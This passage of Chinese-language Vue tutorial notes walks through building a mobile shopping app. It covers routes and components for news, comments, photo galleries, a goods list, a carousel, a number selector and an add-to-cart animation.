      {path:"/search",component:SearchContainer},// 覆盖默认的路由高亮的类，默认的类叫做 router-link-active
  ],
    linkActiveClass:"mui-active"
})

// 把路由对象暴露出去
export default router
```
>[danger] ##### App.vue -- vue入口
```
1.这里面动画效果 其中要在父容器加overflow-x:hidden，为了讲左右产生的滚动条进行隐藏
```
```
1.完成 Header 区域，使用的是 Mint-UI 中的Header组件

2.制作底部的 Tabbar 区域，使用的是 MUI 的 Tabbar.html
3.当使用MUI 一点扩展字体时候需要导入样式和ttf文件
```
```
<template>
  <div class="app-container">
      <!--使用的是mint ui 组件-->
      <mt-header fixed title="商城手机案例"></mt-header>

      <!--引入路由-->

      <transition>
          <router-view></router-view>
      </transition>

      <!--使用的是mui的样式组件-->
      <nav class="mui-bar mui-bar-tab">
          <router-link class="mui-tab-item" to="/home">
              <span class="mui-icon mui-icon-home"></span>
              <span class="mui-tab-label">首页</span>
          </router-link>
          <router-link class="mui-tab-item" to="/member">
              <span class="mui-icon mui-icon-contact"></span>
              <span class="mui-tab-label">会员</span>
          </router-link>
          <router-link class="mui-tab-item" to="/shopcar">
                <span class="mui-icon mui-icon-extra mui-icon-extra-cart">
					<span class="mui-badge">0</span>
				</span>
              <span class="mui-tab-label">购物车</span>
          </router-link>
          <router-link class="mui-tab-item" to="/search">
              <span class="mui-icon mui-icon-search"></span>
              <span class="mui-tab-label">搜索</span>
          </router-link>
      </nav>
  </div>
</template>

<script>

</script>


<style lang="scss" scoped>
.app-container{
    padding-top: 40px;
    overflow-x: hidden;

}

.v-enter {
    opacity: 0;
    transform: translateX(100%);
}

.v-leave-to {
    opacity: 0;
    transform: translateX(-100%);
    position: absolute;
}

.v-enter-active,
.v-leave-active {
    transition: all 0.5s ease;
}
</style>

```
>[success] # 路由对应的路由组件
```
1.HomeContainer/MemberContainer/ShopcarContainer/SearchContainer对应的四个路由组件
```
>[danger] ##### HomeContainer
```
<template>
    <div class="home-container">
        <mt-swipe :auto="4000">
            <mt-swipe-item v-for="i in lunbotuList" :key="i.id">
                <img :src="i.img" alt="">
            </mt-swipe-item>
        </mt-swipe>

        <ul class="mui-table-view mui-grid-view mui-grid-9">
            <li class="mui-table-view-cell mui-media mui-col-xs-4 mui-col-sm-4"><a href="#">
                <img src="../images/menu1.png" alt="">
                <div class="mui-media-body">新闻资讯</div></a></li>
            <li class="mui-table-view-cell mui-media mui-col-xs-4 mui-col-sm-4"><a href="#">
                <img src="../images/menu2.png" alt="">
                <div class="mui-media-body">图片分享</div></a></li>
            <li class="mui-table-view-cell mui-media mui-col-xs-4 mui-col-sm-4"><a href="#">
                <img src="../images/menu3.png" alt="">
                <div class="mui-media-body">商品购买</div></a></li>
            <li class="mui-table-view-cell mui-media mui-col-xs-4 mui-col-sm-4"><a href="#">
                <img src="../images/menu4.png" alt="">
                <div class="mui-media-body">留言反馈</div></a></li>
            <li class="mui-table-view-cell mui-media mui-col-xs-4 mui-col-sm-4"><a href="#">
                <img src="../images/menu5.png" alt="">
                <div class="mui-media-body">视频专区</div></a></li>
            <li class="mui-table-view-cell mui-media mui-col-xs-4 mui-col-sm-4"><a href="#">
                <img src="../images/menu6.png" alt="">
                <div class="mui-media-body">联系我们</div></a></li>
        </ul>
    </div>
</template>

<script>
    import { Toast } from "mint-ui";

    export default {
        data(){
            return{
                lunbotuList:[],
            }
        },
        created(){
            this.getLunbotu()
        },
        methods:{
            getLunbotu(){
                this.$http.get('api/getlunbo')
                    .then(result => {
                        var result = result.body
                        console.log(result)
                        if (result.status === 0){
                            this.lunbotuList = result.message
                        } else {
                            Toast("轮播加载失败")
                        }
                    })
            }
        }
    }
</script>

<style scoped lang="scss">
.mint-swipe{
    height: 200px;
    width: 100%;
    .mint-swipe-item{
        img{
            height: 100%;
            width: 100%;
        }
    }
}
.mui-grid-view.mui-grid-9 {
    background-color: #fff;
    border: none;
    img {
        width: 60px;
        height: 60px;
    }

    .mui-media-body{
        font-size: 13px;
    }
}

.mui-grid-view.mui-grid-9 .mui-table-view-cell {
    border: 0;
}
</style>
```
>[danger] ##### ShopcarContainer
```
<template>
    
</template>

<script>
    export default {
    }
</script>

<style scoped>

</style>
```
>[danger] ##### SearchContainer
```
<template>
    
</template>

<script>
    export default {
    }
</script>

<style scoped>

</style>
```
[TOC]

>[success] # 创建新闻展示组件
* 点击新闻资讯
![](https://box.kancloud.cn/831863f10ddbb8c0674599d49fb1a647_499x275.png)
* 跳转新闻资讯
![](https://box.kancloud.cn/d09318a0809572686c6e3d4926ed5181_492x658.png)
*
```
1.首先个新闻资讯配置路由，做好对应的组件的跳转
2.样式中应用到了弹性盒子display: flex; 的布局
3.使用了vue全局组件fittler 进行格式化时间,使用的时间组件moment
// 导入格式化时间的插件
import moment from 'moment'
// 定义全局的过滤器
Vue.filter('dateFormat', function (dataStr, pattern = "YYYY-MM-DD HH:mm:ss") {
    return moment(dataStr).format(pattern)
})
4.有时候我们想让新闻内容中的图片百分百自适应，需要去掉样式中的scoped ，scoped是组件样式，产原因未知
```
>[danger] #####  路由的配置 router.js
* 在HomeContainer 组件配置好点击跳转路由网址
```
<li class="mui-table-view-cell mui-media mui-col-xs-4 mui-col-sm-4">
                <router-link to="/home/newslist">
                    <img src="../../images/menu1.png" alt="">
                    <div class="mui-media-body">新闻资讯</div>
                </router-link>
 </li>
```
* 在路由分发模块的router.js 做好路由匹配分发
```
import VueRouter from 'vue-router'

import HomeContainer from './compents/tabber/HomeContainer.vue'
import MemberContainer from './compents/tabber/MemberContainer.vue'
import SearchContainer from './compents/tabber/SearchContainer.vue'
import ShopcarContainer from './compents/tabber/ShopcarContainer.vue'
import NewsList from './compents/news/NewsList.vue'
import NewsInfo from './compents/news/NewsInfo.vue'
var router  = new VueRouter({
    routes:[
        {path:'/',redirect:"/home"},
        {path:'/home',component:HomeContainer},
        {path:'/member',component:MemberContainer},
        {path:'/search',component:SearchContainer},
        {path:'/shop',component:ShopcarContainer},
        {path:'/shop',component:ShopcarContainer},
        {path:'/home/newslist',component:NewsList},// 新闻列标
        {path:'/home/newsinfo/:id',component:NewsInfo}, // 新闻详情
    ],
    linkActiveClass:'mui-active'
})

export default router

```
>[danger] ##### 编写新闻列表页组件 -- NewsList.vue
```
1.在src 文件目录下的compents 文件夹中创建一个保存新闻组件的文件夹news
2.创建一个NewsList.vue 组件，组件中的样式用到了html5的弹性盒子
3.使用了vue的过滤器，将时间可以统一显示
```
```
<template>
    <div class="newslist-container">
        <ul class="mui-table-view">
            <li class="mui-table-view-cell mui-media" v-for="item in newsList" :key="item.id">
                <router-link :to="'/home/newsinfo/' + item.id">
                    <img class="mui-media-object mui-pull-left" :src="item.img_url">
                    <div class="mui-media-body">
                        <h1>{{ item.title }}</h1>
                        <p class='mui-ellipsis'>
                            <span>发表时间：{{ item.add_time | dateFormat }}</span>
                            <span>点击：{{item.click}}次</span>
                        </p>
                    </div>
                </router-link>
            </li>

        </ul>

    </div>
</template>

<script>
    import { Toast } from "mint-ui";

    export default {
        data(){
            return{
                newsList:[]
            }
        },
        created(){
            this.getNewsList();
        },
        methods:{
            getNewsList(){
                this.$http.get('api/getnewslist').then(resutl=>{
                    if(resutl.body.status ===0){
                        this.newsList = resutl.body.message
                    }else{
                        Toast("获取新闻列表失败！");
                    }
                })
            }
        }
    }
</script>

<style scoped lang="scss">
    .mui-table-view {
        li {
            h1 {
                font-size: 14px;
            }
            .mui-ellipsis {
                font-size: 12px;
                color: #226aff;
                display: flex;
                justify-content: space-between;
            }
        }
    }
</style>
```
>[danger] ##### 评论组件 -- comment.vue
![](https://box.kancloud.cn/7d90f0847e7aad373f3eac87dcc15f3b_486x216.png)
![](https://box.kancloud.cn/4ae0f46ca578f6ab72e0b213533c75cc_466x109.png)
![](https://box.kancloud.cn/48c2bdfd1306ea3ed04b2a1e7dfce4b1_301x177.png)
```
1. 为加载更多按钮，绑定点击事件，在事件中，请求 下一页数据
2. 点击加载更多，让 pageIndex++ , 然后重新调用 this.getComments() 方法重新获取最新一页的数据
3. 为了防止 新数据 覆盖老数据的情况，我们在 点击加载更多的时候，每当获取到新数据，应该让 老数据 调用 数组的 concat 方法，拼接上新数组
```
* 发表评论
```
1. 把文本框做双向数据绑定
2. 为发表按钮绑定一个事件
3. 校验评论内容是否为空，如果为空，则Toast提示用户 评论内容不能为空
4. 通过 vue-resource 发送一个请求，把评论内容提交给 服务器
5. 当发表评论OK后，重新刷新列表，以查看最新的评论
 + 如果调用 getComments 方法重新刷新评论列表的话，可能只能得到 最后一页的评论，前几页的评论获取不到
 + 换一种思路： 当评论成功后，在客户端，手动拼接出一个 最新的评论对象，然后 调用 数组的 unshift 方法， 把最新的评论，追加到  data 中 comments 的开头；这样，就能 完美实现刷新评论列表的需求；
```
```
<template>
  <div class="cmt-container">
    <h3>发表评论</h3>
    <hr>
    <textarea placeholder="请输入要BB的内容（做多吐槽120字）" maxlength="120" v-model="msg"></textarea>

    <mt-button type="primary" size="large" @click="postComment">发表评论</mt-button>

    <div class="cmt-list">
      <div class="cmt-item" v-for="(item, i) in comments" :key="item.add_time">
        <div class="cmt-title">
          第{{ i+1 }}楼&nbsp;&nbsp;用户：{{ item.user_name }}&nbsp;&nbsp;发表时间：{{ item.add_time | dateFormat }}
        </div>
        <div class="cmt-body">
          {{ item.content === 'undefined' ? '此用户很懒，嘛都没说': item.content }}
        </div>
      </div>

    </div>

    <mt-button type="danger" size="large" plain @click="getMore">加载更多</mt-button>
  </div>
</template>

<script>
import { Toast } from "mint-ui";
export default {
  data() {
    return {
      pageIndex: 1, // 默认展示第一页数据
      comments: [], // 所有的评论数据
      msg: "" // 评论输入的内容
    };
  },
  created() {
    this.getComments();
  },
  methods: {
    getComments() {
      // 获取评论
      this.$http
        .get("api/getcomments/" + this.id + "?pageindex=" + this.pageIndex)
        .then(result => {
          if (result.body.status === 0) {
            // this.comments = result.body.message;
            // 每当获取新评论数据的时候，不要把老数据清空覆盖，而是应该以老数据，拼接上新数据
            this.comments = this.comments.concat(result.body.message);
          } else {
            Toast("获取评论失败！");
          }
        });
    },
    getMore() {
      // 加载更多
      this.pageIndex++;
      this.getComments();
    },
    postComment() {
      // 校验是否为空内容
      if (this.msg.trim().length === 0) {
        return Toast("评论内容不能为空！");
      }

      // 发表评论
      // 参数1： 请求的URL地址
      // 参数2： 提交给服务器的数据对象 { content: this.msg }
      // 参数3： 定义提交时候，表单中数据的格式  { emulateJSON:true }
      this.$http
        .post("api/postcomment/" + this.$route.params.id, {
          content: this.msg.trim()
        })
        .then(function(result) {
          if (result.body.status === 0) {
            // 1. 拼接出一个评论对象
            var cmt = {
              user_name: "匿名用户",
              add_time: Date.now(),
              content: this.msg.trim()
            };
            this.comments.unshift(cmt);
            this.msg = "";
          }
        });
    }
  },
  props: ["id"]
};
</script>

<style lang="scss" scoped>
.cmt-container {
  h3 {
    font-size: 18px;
  }
  textarea {
    font-size: 14px;
    height: 85px;
    margin: 0;
  }

  .cmt-list {
    margin: 5px 0;
    .cmt-item {
      font-size: 13px;
      .cmt-title {
        line-height: 30px;
        background-color: #ccc;
      }
      .cmt-body {
        line-height: 35px;
        text-indent: 2em;
      }
    }
  }
}
</style>

```
>[danger] ##### 编写新闻详情页 -- NewsInfo.vue
 ![](https://box.kancloud.cn/9a4aefac1d3f7fed7dbe9a2a4a51e544_466x486.png)
```
1.在新闻列表页加上对应跳转链接后，创建新闻详情页
2.点击链接跳转到对应组价
3.有时候我们想让新闻内容中的图片百分百自适应，需要去掉样式中的scoped ，scoped是组件样式，产原因未知
```
```
<template>
  <div class="newsinfo-container">
    <!-- 大标题 -->
    <h3 class="title">{{ newsinfo.title }}</h3>
    <!-- 子标题 -->
    <p class="subtitle">
      <span>发表时间：{{ newsinfo.add_time | dateFormat }}</span>
      <span>点击：{{ newsinfo.click }}次</span>
    </p>

    <hr>

    <!-- 内容区域 -->
    <div class="content" v-html="newsinfo.content"></div>

    <!-- 评论子组件区域 -->
    <comment-box :id="this.id"></comment-box>
  </div>
</template>

<script>
// 1. 导入 评论子组件
import comment from "../subcomponents/comment.vue";

export default {
  data() {
    return {
      id: this.$route.params.id, // 将 URL 地址中传递过来的 Id值，挂载到 data上，方便以后调用
      newsinfo: {} // 新闻对象
    };
  },
  created() {
    this.getNewsInfo();
  },
  methods: {
    getNewsInfo() {
      // 获取新闻详情
      this.$http.get("api/getnew/" + this.id).then(result => {
        if (result.body.status === 0) {
          this.newsinfo = result.body.message[0];
        } else {
          Toast("获取新闻失败！");
        }
      });
    }
  },
  components: {
    // 用来注册子组件的节点
    "comment-box": comment
  }
};
</script>

<style lang="scss">
.newsinfo-container {
  padding: 0 4px;
  .title {
    font-size: 16px;
    text-align: center;
    margin: 15px 0;
    color: red;
  }
  .subtitle {
    font-size: 13px;
    color: #226aff;
    display: flex;
    justify-content: space-between;
  }
  .content {
    img {
      width: 100%;
    }
  }
}
</style>

```
>[success] # 图片展示组件
![](https://box.kancloud.cn/5c6fa12130c1ef531bfc8d7e6fdf730b_485x618.png)
>[danger] ##### 图片组件 -- PhotoList.vue
```
 1. 需要借助于 MUI 中的 tab-top-webview-main.html 
 2. 需要把 slider 区域的 mui-fullscreen 类去掉
 3. 滑动条无法正常触发滑动，通过检查官方文档，发现这是JS组件，需要被初始化一下：
  + 导入 mui.js 
  + 调用官方提供的 方式 去初始化：
  ```
  mui('.mui-scroll-wrapper').scroll({
    deceleration: 0.0005 //flick 减速系数，系数越大，滚动速度越慢，滚动距离越小，默认值0.0006
  });
  ```
 4. 我们在初始化 滑动条 的时候，导入的 mui.js ，但是，控制台报错： `Uncaught TypeError: 'caller', 'callee', and 'arguments' properties may not be accessed on strict mode`
  + 经过我们合理的推测，觉得，可能是 mui.js 中用到了 'caller', 'callee', and 'arguments' 东西，但是， webpack 打包好的 bundle.js 中，默认是启用严格模式的，所以，这两者冲突了；
  + 解决方案： 1. 把 mui.js 中的 非严格 模式的代码改掉；但是不现实； 2. 把 webpack 打包时候的严格模式禁用掉；
  + 最终，我们选择了 plan B  移除严格模式： 使用这个插件 babel-plugin-transform-remove-strict-mode
 5. 刚进入 图片分享页面的时候， 滑动条无法正常工作， 经过我们认真的分析，发现， 如果要初始化 滑动条，必须要等 DOM 元素加载完毕，所以，我们把 初始化 滑动条 的代码，搬到了 mounted 生命周期函数中；
 6. 当 滑动条 调试OK后，发现， tabbar 无法正常工作了，这时候，我们需要把 每个 tabbar 按钮的 样式中  `mui-tab-item` 重新改一下名字；
 7. 获取所有分类，并渲染 分类列表；
```
* 图片懒加载
```
1. 图片列表需要使用懒加载技术，我们可以使用 Mint-UI 提供的现成的 组件 `lazy-load`
2. 根据`lazy-load`的使用文档，尝试使用
3. 渲染图片列表数据
```
```
<template>
    <div>

        <!-- 顶部滑动条区域 -->
        <div id="slider" class="mui-slider">
            <div id="sliderSegmentedControl" class="mui-scroll-wrapper mui-slider-indicator mui-segmented-control mui-segmented-control-inverted">
                <div class="mui-scroll">
                    <a :class="['mui-control-item', item.id == 0 ? 'mui-active' : '']" v-for="item in cates" :key="item.id" @tap="getPhotoListByCateId(item.id)">
                        {{ item.title }}
                    </a>
                </div>
            </div>

        </div>

        <!-- 图片列表区域 -->
        <ul class="photo-list">
            <router-link v-for="item in list" :key="item.id" :to="'/home/photoinfo/' + item.id" tag="li">
                <img v-lazy="item.img_url">
                <div class="info">
                    <h1 class="info-title">{{ item.title }}</h1>
                    <div class="info-body">{{ item.zhaiyao }}</div>
                </div>
            </router-link>
        </ul>

    </div>
</template>

<script>
    // 1. 导入 mui 的js文件
    import mui from "../../lib/mui/js/mui.min.js";

    export default {
        data() {
            return {
                cates: [], // 所有分类的列表数组
                list: [] // 图片列表的数组
            };
        },
        created() {
            this.getAllCategory();
            // 默认进入页面，就主动请求 所有图片列表的数据
            this.getPhotoListByCateId(0);
        },
        mounted() {
            // 当 组件中的DOM结构被渲染好并放到页面中后，会执行这个 钩子函数
            // 如果要操作元素了，最好在 mounted 里面，因为，这里时候的 DOM 元素 是最新的
            // 2. 初始化滑动控件
            mui(".mui-scroll-wrapper").scroll({
                deceleration: 0.0005 //flick 减速系数，系数越大，滚动速度越慢，滚动距离越小，默认值0.0006
            });
        },
        methods: {
            getAllCategory() {
                // 获取所有的图片分类
                this.$http.get("api/getimgcategory").then(result => {
                    if (result.body.status === 0) {
                        // 手动拼接出一个最完整的 分类列表
                        result.body.message.unshift({ title: "全部", id: 0 });
                        this.cates = result.body.message;
                    }
                });
            },
            getPhotoListByCateId(cateId) {
                // 根据 分类Id，获取图片列表
                this.$http.get("api/getimages/" + cateId).then(result => {
                    if (result.body.status === 0) {
                        this.list = result.body.message;
                    }
                });
            }
        }
    };
</script>

<style lang="scss" scoped>
    * {
        touch-action: pan-y;
    }

    .photo-list {
        list-style: none;
        margin: 0;
        padding: 10px;
        padding-bottom: 0;
        li {
            background-color: #ccc;
            text-align: center;
            margin-bottom: 10px;
            box-shadow: 0 0 9px #999;
            position: relative;
            img {
                width: 100%;
                vertical-align: middle;
            }
            img[lazy="loading"] {
                width: 40px;
                height: 300px;
                margin: auto;
            }

            .info {
                color: white;
                text-align: left;
                position: absolute;
                bottom: 0;
                background-color: rgba(0, 0, 0, 0.4);
                max-height: 84px;
                .info-title {
                    font-size: 14px;
                }
                .info-body {
                    font-size: 13px;
                }
            }
        }
    }
</style>
```
>[success] ##### 商品缩略图效果
*  实现了 点击图片 跳转到 图片详情页面
```
1. 在改造 li 成 router-link 的时候，需要使用 tag 属性指定要渲染为 哪种元素
```
* 实现 图片详情中 缩略图的功能
```
1. 使用 插件 vue-preview 这个缩略图插件
2. 获取到所有的图片列表，然后使用 v-for 指令渲染数据
3. 注意： img标签上的class不能去掉
4. 注意： 每个 图片数据对象中，必须有 w 和 h 属性
5. 组件使用具体官方文档查看但要在main.js中注册
```
![](https://box.kancloud.cn/a9b0e201bc74ff7fba6ab724cf6fef37_461x570.png)
```
<template>
  <div class="photoinfo-container">
    <h3>{{ photoinfo.title }}</h3>
    <p class="subtitle">
      <span>发表时间：{{ photoinfo.add_time  }}</span>
      <span>点击：{{ photoinfo.click }}次</span>
    </p>

    <hr>

    <!-- 缩略图区域 -->
    <div class="thumbs">
      <vue-preview :slides="list" ></vue-preview>
    </div>

    <!-- 图片内容区域 -->
    <div class="content" v-html="photoinfo.content"></div>

    <!-- 放置一个现成的 评论子组件 -->
    <cmt-box :id="id"></cmt-box>
  </div>
</template>

<script>
    // 1. 导入评论子组件
    import comment from "../subcomponents/comment.vue";

    export default {
        data() {
            return {
                id: this.$route.params.id, // 从路由中获取到的 图片Id
                photoinfo: {}, // 图片详情
                list: [] // 缩略图的数组
            };
        },
        created() {
            this.getPhotoInfo();
            this.getThumbs();
        },
        methods: {
            getPhotoInfo() {
                // 获取图片的详情
                this.$http.get("api/getimageInfo/" + this.id).then(result => {
                    if (result.body.status === 0) {
                        this.photoinfo = result.body.message[0];
                    }
                });
            },
            getThumbs() {
                // 获取缩略图
                this.$http.get("api/getthumimages/" + this.id).then(result => {
                    if (result.body.status === 0) {
                        // 循环每个图片数据，补全图片的宽和高
                        result.body.message.forEach(item => {
                            item.w = 600;
                            item.h = 400;
                            item.msrc = item.src
                        });
                        // 把完整的数据保存到 list 中
                        this.list = result.body.message;
                    }
                });
            }
        },
        components: {
            // 注册 评论子组件
            "cmt-box": comment
        }
    };
</script>

<style lang="scss" scoped>
  .photoinfo-container {
    padding: 3px;
    h3 {
      color: #26a2ff;
      font-size: 15px;
      text-align: center;
      margin: 15px 0;
    }
    .subtitle {
      display: flex;
      justify-content: space-between;
      font-size: 13px;
    }

    .content {
      font-size: 13px;
      line-height: 30px;
    }

    .thumbs{
      img{
        margin: 10px;
        box-shadow: 0 0 8px #999;
      }
    }
  }
</style>

```
>[success] # 商品列表页布局
![](https://box.kancloud.cn/e5fbec22892c38eb64fce826dea87981_494x661.png)
>[danger] ##### Goodlist.vue
```
<template>
    <div class="goods-list">

        <div class="goods-item" v-for="item in goodslist" :key="item.id" @click="goDetail(item.id)">
            <img :src="item.img_url" alt="">
            <h1 class="title">{{ item.title }}</h1>
            <div class="info">
                <p class="price">
                    <span class="now">￥{{ item.sell_price }}</span>
                    <span class="old">￥{{ item.market_price }}</span>
                </p>
                <p class="sell">
                    <span>热卖中</span>
                    <span>剩{{ item.stock_quantity }}件</span>
                </p>
            </div>
        </div>



        <mt-button type="danger" size="large" @click="getMore">加载更多</mt-button>

    </div>
</template>

<script>
    export default {
        data:function () {
            return{
                pageIndex:1,
                goodslist:[]
            }
        },
        created(){
            this.getGoodsList()
        },
        methods: {
            getGoodsList() {
                this.$http.get("api/getgoods?pageindex=" + this.pageIndex)
                    .then(result => {
                        var restult = result.body
                        if (restult.status === 0) {
                            this.goodslist = this.goodslist.concat(restult.message)
                        }
                    })
            },
            getMore() {
                this.pageIndex++
                this.getGoodsList()
            },
            goDetail(id){
                this.$router.push({ name: "goodsinfo", params: { id } });
            }
        }
    }
</script>

<style lang="scss" scoped>
    .goods-list{
        display: flex;
        flex-wrap: wrap;
        padding: 7px;
        justify-content: space-between;

        .goods-item{
            width: 49%;
            border: 1px solid #ccc;
            box-shadow: 0 0 8px #ccc;
            margin: 4px 0;
            padding: 2px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            min-height: 293px;
            img{
                width: 100%;
            }
            .title{
                font-size: 14px;
            }

            .info{
                background-color: #eee;
                p{
                    margin: 0;
                    padding: 5px;
                }
                .price{
                    .now{
                        color: red;
                        font-weight: bold;
                        font-size: 16px;
                    }
                    .old{
                        text-decoration: line-through;
                        font-size: 12px;
                        margin-left: 10px;
                    }
                }
                .sell{
                    display: flex;
                    justify-content: space-between;
                    font-size: 13px;
                }
            }
        }
    }
</style>
```
>[success] # 购物车动画效果
* 最开始将小球定位到按钮位置
![](https://box.kancloud.cn/a7d0c6a2bc38c2b998ce04612bbebdce_333x120.png)
>[danger] ##### 案例
```
<template>
  <div class="goodsinfo-container">

    <transition
      @before-enter="beforeEnter"
      @enter="enter"
      @after-enter="afterEnter">
      <div class="ball" v-show="ballFlag" ref="ball"></div>
    </transition>
    
    <!-- 商品轮播图区域 -->
    <div class="mui-card">
      <div class="mui-card-content">
        <div class="mui-card-content-inner">
          <swiper :lunbotuList="lunbotu" :isfull="false"></swiper>
        </div>
      </div>
    </div>


    <!-- 商品购买区域 -->
    <div class="mui-card">
      <div class="mui-card-header">{{ goodsinfo.title }}</div>
      <div class="mui-card-content">
        <div class="mui-card-content-inner">
          <p class="price">
            市场价：<del>￥{{ goodsinfo.market_price }}</del>&nbsp;&nbsp;销售价：<span class="now_price">￥{{ goodsinfo.sell_price }}</span>
          </p>
          <p>购买数量：<numbox @getcount="getSelectedCount" :max="goodsinfo.stock_quantity"></numbox></p>
          <p>
            <mt-button type="primary" size="small">立即购买</mt-button>
            <mt-button type="danger" size="small" @click="addToShopCar">加入购物车</mt-button>
            <!-- 分析： 如何实现加入购物车时候，拿到 选择的数量 -->
            <!-- 1. 经过分析发现： 按钮属于 goodsinfo 页面， 数字 属于 numberbox 组件 -->
            <!-- 2. 由于涉及到了父子组件的嵌套了，所以，无法直接在 goodsinfo 页面zhong 中获取到 选中的商品数量值-->
            <!-- 3. 怎么解决这个问题：涉及到了 子组件向父组件传值了（事件调用机制） -->
            <!-- 4. 事件调用的本质： 父向子传递方法，子调用这个方法， 同时把 数据当作参数 传递给这个方法 -->
          </p>
        </div>
      </div>
    </div>


    <!-- 商品参数区域 -->
    <div class="mui-card">
      <div class="mui-card-header">商品参数</div>
      <div class="mui-card-content">
        <div class="mui-card-content-inner">
          <p>商品货号：{{ goodsinfo.goods_no }}</p>
          <p>库存情况：{{ goodsinfo.stock_quantity }}件</p>
          <p>上架时间：{{ goodsinfo.add_time | dateFormat }}</p>
        </div>
      </div>
      <div class="mui-card-footer">
        <mt-button type="primary" size="large" plain @click="goDesc(id)">图文介绍</mt-button>
        <mt-button type="danger" size="large" plain @click="goComment(id)">商品评论</mt-button>
      </div>
    </div>


  </div>
</template>

<script>
// 导入轮播图组件
import swiper from "../subcomponents/swiper.vue";
// 导入 数字选择框 组件
import numbox from "../subcomponents/goodsinfo_numbox.vue";

export default {
  data() {
    return {
      id: this.$route.params.id, // 将路由参数对象中的 id 挂载到 data , 方便后期调用
      lunbotu: [], // 轮播图的数据
      goodsinfo: {}, // 获取到的商品的信息
      ballFlag: false, // 控制小球的隐藏和显示的标识符
      selectedCount: 1 // 保存用户选中的商品数量， 默认，认为用户买1个
    };
  },
  created() {
    this.getLunbotu();
    this.getGoodsInfo();
  },
  methods: {
    getLunbotu() {
      this.$http.get("api/getthumimages/" + this.id).then(result => {
        if (result.body.status === 0) {
          // 先循环轮播图数组的每一项，为 item 添加 img 属性，因为 轮播图 组件中，只认识 item.img， 不认识 item.src
          result.body.message.forEach(item => {
            item.img = item.src;
          });
          this.lunbotu = result.body.message;
        }
      });
    },
    getGoodsInfo() {
      // 获取商品的信息
      this.$http.get("api/goods/getinfo/" + this.id).then(result => {
        if (result.body.status === 0) {
          this.goodsinfo = result.body.message[0];
        }
      });
    },
    goDesc(id) {
      // 点击使用编程式导航跳转到 图文介绍页面
      this.$router.push({ name: "goodsdesc", params: { id } });
    },
    goComment(id) {
      // 点击跳转到 评论页面
      this.$router.push({ name: "goodscomment", params: { id } });
    },
    addToShopCar() {
      // 添加到购物车
      this.ballFlag = !this.ballFlag;
    },
    beforeEnter(el) {
      el.style.transform = "translate(0, 0)";
    },
    enter(el, done) {
      el.offsetWidth;

      // 小球动画优化思路：
      // 1. 先分析导致 动画 不准确的 本质原因： 我们把 小球 最终 位移到的 位置，已经局限在了某一分辨率下的 滚动条未滚动的情况下；
      // 2. 只要分辨率和 测试的时候不一样，或者 滚动条有一定的滚动距离之后， 问题就出现了；
      // 3. 因此，我们经过分析，得到结论： 不能把 位置的 横纵坐标 直接写死了，而是应该 根据不同情况，动态计算这个坐标值；
      // 4. 经过分析，得出解题思路： 先得到 徽标的 横纵 坐标，再得到 小球的 横纵坐标，然后 让 y 值 求差， x 值也求 差，得到 的结果，就是横纵坐标要位移的距离
      // 5. 如何 获取 徽标和小球的 位置   domObject.getBoundingClientRect()

      // 获取小球的 在页面中的位置
      const ballPosition = this.$refs.ball.getBoundingClientRect();
      // 获取 导航栏购物车位置 在页面中的位置
      const badgePosition = document
        .getElementById("badge")
        .getBoundingClientRect();

      const xDist = badgePosition.left - ballPosition.left;
      const yDist = badgePosition.top - ballPosition.top;

      el.style.transform = `translate(${xDist}px, ${yDist}px)`;
      el.style.transition = "all 0.5s cubic-bezier(.4,-0.3,1,.68)";
      done();
    },
    afterEnter(el) {
      this.ballFlag = !this.ballFlag;
    },
    getSelectedCount(count) {
      // 当子组件把 选中的数量传递给父组件的时候，把选中的值保存到 data 上
      this.selectedCount = count;
      console.log("父组件拿到的数量值为： " + this.selectedCount);
    }
  },
  components: {
    swiper,
    numbox
  }
};
</script>

<style lang="scss" scoped>
.goodsinfo-container {
  background-color: #eee;
  overflow: hidden;

  .now_price {
    color: red;
    font-size: 16px;
    font-weight: bold;
  }

  .mui-card-footer {
    display: block;
    button {
      margin: 15px 0;
    }
  }

  .ball {
    width: 15px;
    height: 15px;
    border-radius: 50%;
    background-color: red;
    position: absolute;
    z-index: 99;
    top: 390px;
    left: 146px;
  }
}
</style>

```
>[danger] ##### 轮播图组件
``` 
1.轮播图组件中有几点第一点是样式问题单独抽离
2.是解决父传子的问题
```
```
<template>
    <div>
        <mt-swipe :auto="4000">
            <!-- 在组件中，使用v-for循环的话，一定要使用 key -->
            <!-- 将来，谁使用此 轮播图组件，谁为我们传递 lunbotuList -->
            <!-- 此时，lunbotuList 应该是 父组件向子组件传值来设置 -->
            <mt-swipe-item v-for="item in lunbotuList" :key="item.url">
                <img :src="item.img" alt="" :class="{'full': isfull}">
            </mt-swipe-item>
        </mt-swipe>
    </div>
</template>

<script>
    export default {
        props: ["lunbotuList", "isfull"]
    }
</script>

<style lang="scss" scoped>
    .mint-swipe {
        height: 200px;

    .mint-swipe-item {
        text-align: center;

    img {
    // width: 100%;
        height: 100%;
    }
    }
    }

    .full {
        width: 100%;
    }
</style>
```

>[success] # number 组件
```
1.异步问题，所以用watch 监听数据，数据一改变就根据就根据监听数据改变
2.在input 上绑定change事件，为了让父组件可以得到，子组件中的数量进行下一步操作
```
>[danger] ##### 代码
```
<template>
<!-- 问题： 我们不知道什么时候能够拿到 max 值，但是，总归有一刻，会得到一个真正的 max 值 -->
<!-- 我们可以 使用 watch 属性监听，来 监听 父组件传递过来的 max 值，不管 watch 会被触发几次，但是，最后一次，肯定是一个 合法的 max 数值 -->
  <div class="mui-numbox" data-numbox-min='1'>
    <button class="mui-btn mui-btn-numbox-minus" type="button">-</button>
    <input id="test" class="mui-input-numbox" type="number" value="1" @change="countChanged" ref="numbox" />
    <button class="mui-btn mui-btn-numbox-plus" type="button">+</button>
  </div>

  <!-- 分析： 子组件什么时候把 数据传递给父组件 -->
  <!--  -->
</template>

<script>
import mui from "../../lib/mui/js/mui.min.js";

export default {
  mounted() {
    // 初始化数字选择框组件
    mui(".mui-numbox").numbox();
    console.log(this.max);
  },
  methods: {
    countChanged() {
      // 每当 文本框的数据被修改的时候，立即把 最新的数据，通过事件调用，传递给父组件
      // console.log(this.$refs.numbox.value);
      this.$emit("getcount", parseInt(this.$refs.numbox.value));
    }
  },
  props: ["max"],
  watch: {
    // 属性监听
    max: function(newVal, oldVal) {
      // 使用 JS API 设置 numbox 的最大值
      mui(".mui-numbox")
        .numbox()
        .setOption("max", newVal);
    }
  }
};
</script>

<style lang="scss" scoped>

</style>

```
```
<template>
  <div class="shopcar-container">
    
    <div class="goods-list">

      <!-- 商品列表项区域 -->
